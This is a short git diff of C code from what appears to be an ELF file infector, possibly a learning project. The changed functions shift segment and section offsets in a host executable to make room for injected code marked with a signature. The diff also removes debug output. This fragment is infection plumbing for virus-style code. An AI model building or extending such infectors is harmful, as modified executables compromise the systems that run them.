@@ -27,11 +27,7 @@ void		*add_padding_segments(t_elf *elf, void *src, void **dst, int nb_zero)
 	int		previous_padding = next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz);
 
 	size = ((intptr_t)_start - (intptr_t)infect) + INJECT_SIZE + ft_strlen(SIGNATURE) + nb_zero - previous_padding;
-	int		add = (elf->pt_load->p_offset + elf->pt_load->p_filesz + size) - next->p_offset;
-	ft_putstr("test: ");
-	ft_putnbr(add);
-	ft_putstr("\n");
-	shoff = elf->header->e_shoff + add;
+	shoff = elf->header->e_shoff + size;
 	ft_memcpy(*dst, src, (unsigned long)&elf->header->e_shoff - (unsigned long)src);
 	*dst += (unsigned long)&elf->header->e_shoff - (unsigned long)src;
 	ft_memcpy(*dst, &shoff, sizeof(shoff));
@@ -41,7 +37,7 @@ void		*add_padding_segments(t_elf *elf, void *src, void **dst, int nb_zero)
 	{
 		if (elf->segments[i].p_offset > (unsigned long)elf->pt_load->p_offset + elf->pt_load->p_filesz)
 		{
-			shoff = elf->segments[i].p_offset + add;
+			shoff = elf->segments[i].p_offset + size;
 			ft_memcpy(*dst, src, (unsigned long)&elf->segments[i].p_offset - (unsigned long)src);
 			*dst += (unsigned long)&elf->segments[i].p_offset - (unsigned long)src;
 			ft_memcpy(*dst, &shoff, sizeof(shoff));
@@ -62,12 +58,11 @@ void		*add_padding_sections(t_elf *elf, void *src, void **dst, int nb_zero)
 	int		previous_padding = next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz);
 
 	size = ((intptr_t)_start - (intptr_t)infect) + INJECT_SIZE + ft_strlen(SIGNATURE) + nb_zero - previous_padding;
-	int		add = (elf->pt_load->p_offset + elf->pt_load->p_filesz + size) - next->p_offset;
 	for (int i = 0; i < elf->header->e_shnum; i++)
 	{
 		if ((unsigned long)elf->sections[i].sh_offset > elf->pt_load->p_offset + elf->pt_load->p_filesz)
 		{
-			shoff = elf->sections[i].sh_offset + add;
+			shoff = elf->sections[i].sh_offset + size;
 			ft_memcpy(*dst, src, (unsigned long)&elf->sections[i].sh_offset - (unsigned long)src);
 			*dst += (unsigned long)&elf->sections[i].sh_offset - (unsigned long)src;
 			ft_memcpy(*dst, &shoff, sizeof(shoff));
